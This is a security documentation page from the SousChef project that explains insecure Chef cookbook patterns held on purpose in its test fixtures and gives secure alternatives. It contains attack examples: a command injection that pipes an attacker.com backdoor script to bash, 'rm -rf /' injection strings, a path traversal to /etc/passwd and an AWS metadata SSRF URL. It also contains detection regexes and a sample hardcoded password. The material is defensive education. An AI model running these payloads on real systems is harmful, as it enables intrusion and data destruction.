# Security Anti-Patterns in Chef Cookbooks

**Purpose:** This document identifies common security anti-patterns found in Chef cookbooks that SousChef's test fixtures intentionally demonstrate. These patterns represent real-world code that the converter must handle, but should **never** be copied into production.

---

## Overview

SousChef's test fixtures in `tests/integration/fixtures/` contain intentionally insecure Chef code patterns. These examples serve two purposes:

1. **Test Converter Robustness**: Verify SousChef can parse and convert real-world Chef code (which often contains security issues)
2. **Security Education**: Document what patterns to avoid and why they're dangerous

This document explains each anti-pattern, why it's dangerous, and provides secure alternatives.

---

## Anti-Pattern 1: String Interpolation in Shell Commands

### Location
`tests/integration/fixtures/docker_cookbook/resources/container.rb` (line 24)

### Insecure Code
```ruby
execute "pull-docker-image-#{new_resource.image}" do
  command "docker pull #{new_resource.image}:#{new_resource.tag}"
  not_if "docker images | grep -q #{new_resource.image}"
end
```

### Why It's Dangerous
- **Command Injection (CWE-78)**: If `new_resource.image` contains shell metacharacters (`;`, `|`, `&`, `$()`, etc.), the attacker can execute arbitrary commands
- **String Concatenation Risk**: Ruby's `#{}` interpolation doesn't escape shell special characters
- **Attack Vector**: A malicious cookbook attribute like `image: "nginx; rm -rf /"` would execute both commands

### Attack Example
```ruby
# Attacker-controlled attribute:
default['myapp']['image'] = "nginx; curl http://attacker.com/backdoor.sh | bash"

# Results in command:
# docker pull nginx; curl http://attacker.com/backdoor.sh | bash:latest
```

### Secure Alternative
```ruby
execute "pull-docker-image-#{new_resource.image}" do
  # Use array form - Chef passes arguments directly without shell interpretation
  command ["docker", "pull", "#{new_resource.image}:#{new_resource.tag}"]
  not_if { ::File.exist?("/var/lib/docker/image/...") }  # Or use proper Docker API
end
```

### Defence Mechanisms
1. **Array Form Commands**: Always use array `["cmd", "arg1", "arg2"]` instead of strings
2. **Input Validation**: Validate image names against regex: `^[a-z0-9][a-z0-9._-]*(/[a-z0-9._-]+)*$`
3. **Avoid Shell Metacharacters**: Never allow `;|&$()<>` in parameters
4. **Use APIs**: Prefer Docker SDK/API over shell commands

### OWASP Mapping
- **OWASP Top 10:** A03:2021 - Injection
- **CWE:** CWE-78 (Improper Neutralisation of Special Elements used in OS Command)
- **CAPEC:** CAPEC-88 (OS Command Injection)

---

## Anti-Pattern 2: Variable Interpolation in URLs

### Location
`tests/integration/fixtures/habitat_package/plan.sh` (line 9)

### Insecure Code
```bash
pkg_source="https://nginx.org/download/${pkg_name}-${pkg_version}.tar.gz"
```

### Why It's Dangerous (When Misused)
- **SSRF Vulnerabilities (CWE-918)**: If `pkg_source` uses user-controlled variables, attackers can make the build system fetch arbitrary URLs
- **DNS Rebinding**: Attacker can point domain to internal IP after DNS lookup
- **Local File Access**: URLs like `file:///etc/passwd` could expose sensitive files
- **Internal Network Scanning**: Attacker discovers internal services by forcing requests to private IPs

### Attack Example
```bash
# Attacker-controlled input (unsafe):
pkg_name_from_user="../../../../../../etc/passwd%23"
pkg_source="https://example.com/${pkg_name_from_user}.tar.gz"
# Results in: https://example.com/../../../../../../etc/passwd#.tar.gz

# SSRF attack:
pkg_source_from_user="http://169.254.169.254/latest/meta-data/"  # AWS metadata
```

### Why THIS Example is Safe
The test fixture uses **hardcoded local variables** only:
- `pkg_name` is defined in same file (line 5): `pkg_name=nginx`
- `pkg_version` is defined in same file (line 7): `pkg_version="1.25.3"`
- No external input involved

### Secure Alternative
```bash
# 1. Hardcode trusted URLs (preferred for packages)
pkg_source="https://nginx.org/download/nginx-1.25.3.tar.gz"
pkg_shasum="f9187468ff2eb159260bfd53867c25ff8e334726237acf5021f65f95f8d3f945"

# 2. If dynamic URLs needed, validate thoroughly:
validate_url() {
  local url="$1"
  
  # Parse URL components
  if ! [[ "$url" =~ ^https:// ]]; then
    echo "Error: Only HTTPS URLs allowed" >&2
    return 1
  fi
  
  # Extract hostname
  hostname=$(echo "$url" | sed -E 's|^https://([^/]+).*|\1|')
  
  # Block private IP ranges
  if host "$hostname" | grep -qE '(^127\.)|(^10\.)|(^172\.(1[6-9]|2[0-9]|3[0-1])\.)|(^192\.168\.)'; then
    echo "Error: Private IP addresses not allowed" >&2
    return 1
  fi
  
  # Block local/internal domains
  if [[ "$hostname" =~ \.(local|internal|localhost)$ ]]; then
    echo "Error: Local domains not allowed" >&2
    return 1
  fi
  
  echo "$url"
}

pkg_source=$(validate_url "https://nginx.org/download/${pkg_name}-${pkg_version}.tar.gz")
```

### Defence Mechanisms
1. **HTTPS-Only**: Reject `http://`, `ftp://`, `file://` schemes
2. **Allowlist Domains**: Only permit known-safe domains (e.g., `*.github.com`, `*.npmjs.org`)
3. **IP Range Blocking**: Block RFC1918 private IPs, loopback, link-local, multicast
4. **DNS Validation**: Resolve hostname and block private IPs before request
5. **URL Parsing**: Use proper URL parser, validate each component separately

### OWASP Mapping
- **OWASP Top 10:** A10:2021 - Server-Side Request Forgery (SSRF)
- **CWE:** CWE-918 (Server-Side Request Forgery)
- **CAPEC:** CAPEC-664 (Server Side Request Forgery)

---

## Anti-Pattern 3: Using `eval` in Shell Scripts

### Insecure Code
```bash
# NEVER do this:
user_input="$1"
eval "echo $user_input"
```

### Why It's Dangerous
- **Arbitrary Code Execution**: `eval` executes string as code
- **No Input Validation**: Any shell command can be injected
- **Cascading Attacks**: Can modify system, install backdoors, exfiltrate data

### Attack Example
```bash
# Attacker provides:
user_input='Hello"; rm -rf /; echo "'
eval "echo $user_input"
# Executes: echo Hello"; rm -rf /; echo "
# Result: System wiped
```

### Secure Alternative
```bash
# Use parameter expansion and proper quoting:
user_input="$1"
echo "$user_input"  # Safely prints literal value

# For computed variable names, use indirect expansion:
var_name="my_config"
value="${!var_name}"  # Safer than eval
```

### SousChef Converter Behaviour
SousChef's Habitat converter (`souschef/converters/habitat.py`) **blocks** `eval` patterns by default:

```python
dangerous_patterns = [
    (r"curl.*\|.*sh", "Piping curl output to shell"),
    (r"wget.*\|.*sh", "Piping wget output to shell"),
    (r"\beval\b", "Use of eval command"),
]

for pattern, description in dangerous_patterns:
    if re.search(pattern, callback_content):
        raise SecurityError(
            f"Dangerous pattern detected: {description}\n"
            f"Use --allow-dangerous-patterns to override (not recommended)"
        )
```

### Defence Mechanisms
1. **Never Use `eval`**: Almost always avoidable
2. **Input Validation**: If unavoidable, validate against strict allowlist
3. **Sandboxing**: Run in restricted shell (rbash) or container
4. **Static Analysis**: Tools should flag `eval` usage

### OWASP Mapping
- **OWASP Top 10:** A03:2021 - Injection
- **CWE:** CWE-95 (Improper Neutralisation of Directives in Dynamically Evaluated Code)

---

## Anti-Pattern 4: Piping `curl`/`wget` to Shell

### Insecure Code
```bash
# EXTREMELY DANGEROUS:
curl https://example.com/install.sh | bash
wget -O - https://example.com/install.sh | sh
```

### Why It's Dangerous
- **No Integrity Verification**: Script could be modified in transit
- **MitM Attacks**: Attacker on network can inject malicious code
- **No Inspection**: Code runs before you can review it
- **Privilege Escalation**: Often run as root during system setup

### Attack Scenarios
1. **DNS Hijacking**: Attacker compromises DNS, redirects domain to malicious server
2. **BGP Route Hijacking**: Network-level attack redirects traffic
3. **Compromised CDN**: If installation script hosted on CDN, attackers may compromise it
4. **Typosquatting**: User mistypes URL, downloads malware

### Secure Alternative
```bash
# 1. Download, verify checksum, then execute:
curl -fsSL https://example.com/install.sh -o install.sh
echo "expected_sha256_hash  install.sh" | sha256sum -c -
bash install.sh

# 2. Use package manager:
apt-get install package-name  # Verifies signatures

# 3. For Habitat plans, validate source:
pkg_source="https://example.com/package.tar.gz"
pkg_shasum="f9187468ff2eb159260bfd53867c25ff8e334726237acf5021f65f95f8d3f945"
# Habitat will verify checksum before executing
```

### SousChef Converter Behaviour
The Habitat converter blocks these patterns:

```python
if re.search(r"curl.*\|.*sh", callback_content):
    raise SecurityError(
        "Dangerous pattern detected: Piping curl output to shell\n"
        "Download script, verify integrity, then execute separately"
    )
```

### Defence Mechanisms
1. **Checksum Verification**: Always verify SHA256/SHA512 of downloaded scripts
2. **HTTPS + Certificate Pinning**: Ensure TLS prevents MitM
3. **Code Review**: Download, inspect, then execute manually
4. **Official Packages**: Prefer OS package managers with signature verification

### OWASP Mapping
- **OWASP Top 10:** A08:2021 - Software and Data Integrity Failures
- **CWE:** CWE-494 (Download of Code Without Integrity Check)

---

## Anti-Pattern 5: Hardcoded Credentials

### Insecure Code
```ruby
# NEVER do this:
database_connection 'app_db' do
  connection(
    host: 'db.example.com',
    username: 'admin',
    password: 'SuperSecret123!'  # Hardcoded!
  )
end
```

### Why It's Dangerous
- **Version Control Exposure**: Credentials committed to Git history
- **Public Repository Leaks**: Accidentally pushed to public GitHub
- **Log Contamination**: Passwords appear in Chef logs
- **Rotation Difficulty**: Changing password requires code changes

### Secure Alternative
```ruby
# Use Chef Vault or encrypted data bags:
chef_vault_item = chef_vault_item('passwords', 'database')

database_connection 'app_db' do
  connection(
    host: 'db.example.com',
    username: chef_vault_item['username'],
    password: chef_vault_item['password']
  )
end

# Or environment variables (better for containers):
database_connection 'app_db' do
  connection(
    host: node['db_host'],
    username: ENV['DB_USERNAME'],
    password: ENV['DB_PASSWORD']
  )
end
```

### Defence Mechanisms
1. **Secrets Management**: Use Chef Vault, HashiCorp Vault, AWS Secrets Manager
2. **Environment Variables**: Better than hardcoding, but still needs protection
3. **Secret Scanning**: Use TruffleHog, git-secrets to detect commits
4. **Rotation**: Implement automatic credential rotation
5. **Audit**: Monitor who accesses secrets and when

---

## Converter Security Validation

### Current Protections in SousChef

1. **Habitat Converter** (`souschef/converters/habitat.py`):
   - Blocks `curl|sh` and `wget|sh` patterns by default
   - Blocks `eval` usage
   - Requires `--allow-dangerous-patterns` flag to override
   - Documents security implications in generated Dockerfiles

2. **Playbook Converter** (`souschef/converters/playbook.py`):
   - Validates Chef Server URLs for SSRF protection
   - Blocks private IP ranges in generated inventory scripts
   - Enforces HTTPS-only connections

3. **Recipe Parser** (`souschef/parsers/recipe.py`):
   - Regex timeout protection (prevents ReDoS attacks)
   - Manual block parser for nested structures
   - Length limits on parsed resources

### Validation Recommendations

When converting Chef cookbooks, SousChef should:

1. **Detect Command Injection**:
   - Flag string interpolation in `execute` resources
   - Recommend array form commands
   - Warn about shell metacharacters in variables

2. **Detect SSRF Risks**:
   - Validate all URL constructions
   - Flag dynamic URL components from attributes
   - Recommend URL validation functions

3. **Flag Dangerous Patterns**:
   - Detect `eval`, backticks, `system()` calls
   - Flag `curl|sh` and `wget|sh` patterns
   - Warn about `shell=True` in subprocess calls

4. **Credential Detection**:
   - Scan for hardcoded passwords (regex patterns)
   - Detect `password: "..."` in resource blocks
   - Recommend Chef Vault or environment variables

---

## Testing Strategy

### Test Fixture Philosophy

SousChef's test fixtures intentionally contain insecure code because:

1. **Real-World Representation**: Many production Chef cookbooks have these issues
2. **Converter Robustness**: Tool must handle imperfect input gracefully
3. **Security Education**: Documented examples teach secure alternatives
4. **Validation Testing**: Verify security warnings are triggered correctly

### Test Fixture Security Markers

All test fixtures with intentional vulnerabilities must include:

```ruby
# ⚠️ SECURITY WARNING - TEST FIXTURE ONLY - ANTI-PATTERN EXAMPLE
# [Description of vulnerability]
#
# SECURE ALTERNATIVE:
# [Code example of secure version]
#
# This test fixture is intentionally insecure to verify the converter
# can handle real-world Chef code patterns. DO NOT copy this pattern.
```

### Validation Test Cases

For each anti-pattern, tests should verify:

1. **Parser Handles Code**: Converter doesn't crash on insecure patterns
2. **Security Warning Emitted**: Tool warns users about detected issues
3. **Secure Alternative Suggested**: Conversion includes remediation guidance
4. **Conversion Accuracy**: Even insecure code is converted correctly

---

## References

### Security Standards
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
- [NIST Secure Software Development Framework](https://csrc.nist.gov/projects/ssdf)

### Chef-Specific Security
- [Chef Security Best Practices](https://docs.chef.io/security/)
- [Chef Vault Documentation](https://docs.chef.io/chef_vault/)
- [InSpec Security Testing](https://www.inspec.io/docs/)

### Related SousChef Documentation
- [SECURITY.md](../SECURITY.md) - Security policy and features
- [SECURITY_REVIEW.md](../SECURITY_REVIEW.md) - Comprehensive security assessment
- [docs/migration-guide/security-considerations.md](migration-guide/security-considerations.md) - Migration security

---

## Contributing

When adding new test fixtures with security anti-patterns:

1. Add clear warning comments explaining the vulnerability
2. Document the secure alternative in comments
3. Add entry to this document explaining the pattern
4. Include test cases that verify security warnings
5. Never use real credentials or sensitive data

See [CONTRIBUTING.md](../CONTRIBUTING.md) for full guidelines.
